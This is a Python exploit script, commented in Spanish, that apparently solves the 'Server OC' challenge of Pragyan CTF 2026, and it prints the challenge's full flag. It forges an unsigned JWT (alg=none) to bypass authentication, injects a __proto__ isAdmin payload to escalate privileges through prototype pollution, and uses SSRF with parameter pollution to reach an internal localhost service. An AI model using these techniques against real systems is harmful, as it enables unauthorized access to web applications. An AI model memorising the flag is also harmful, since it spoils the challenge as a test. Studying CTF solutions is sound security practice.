#!/usr/bin/env python3
"""
Server OC - Pragyan CTF 2026
Flag completa: p_ctf{L!qU1d_H3L1um_$h0ulD_N0T_T0uch_$3rv3rs}

Parte 1: JWT alg=none bypass + Prototype Pollution (/logs con isAdmin)
Parte 2: SSRF via /benchmark con debug=true

Uso:
  python3 exploit_server_oc.py
"""
import requests
import base64
import json

BASE = "https://server-oc.ctf.prgy.in"


def get_part1():
    """
    Parte 1: JWT alg=none + Prototype Pollution

    1. El endpoint POST /leConfig devuelve un JWT con info sobre /logs
    2. Forjamos un JWT con alg=none (sin firma) para bypass de auth
    3. Enviamos a /logs con __proto__.isAdmin=true para escalar privilegios
    """
    # Forjar JWT con alg=none
    header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).rstrip(b'=').decode()

    payload = base64.urlsafe_b64encode(
        json.dumps({
            "endpoint": "/logs",
            "examplePayload": {"Path": "C:\\Windows\\Log\\systemRestore"},
            "iat": 1770459903
        }).encode()
    ).rstrip(b'=').decode()

    forged_jwt = f"{header}.{payload}."

    # Enviar con prototype pollution
    r = requests.post(
        f"{BASE}/logs",
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {forged_jwt}"
        },
        json={
            "Path": "C:\\Windows\\Log\\systemRestore",
            "__proto__": {"isAdmin": True}
        }
    )

    data = r.json()
    part1 = data.get("message", "")
    print(f"[+] Parte 1: {part1}")
    return part1


def get_part2():
    """
    Parte 2: SSRF con parameter pollution

    1. /api/benchmark/url revela URL interna: /benchmark?url=http://localhost:3001/benchmark?internal=flag
    2. Inyectamos debug=true en la URL interna via parameter pollution
    3. El backend interno responde con la segunda parte de la flag
    """
    r = requests.get(
        f"{BASE}/benchmark",
        params={
            "url": "http://localhost:3001/benchmark?debug=true",
            "internal": "flag"
        }
    )

    text = r.text.strip()
    # Extraer flag del formato "Flag : xxxxx"
    if "Flag" in text:
        part2 = text.split(":")[-1].strip()
    else:
        part2 = text

    print(f"[+] Parte 2: {part2}")
    return part2


def main():
    print("[*] Server OC - Pragyan CTF 2026")
    print("[*] Explotando vulnerabilidades...\n")

    part1 = get_part1()
    part2 = get_part2()

    flag = part1 + part2
    print(f"\n[*] Flag completa: {flag}")


if __name__ == "__main__":
    main()
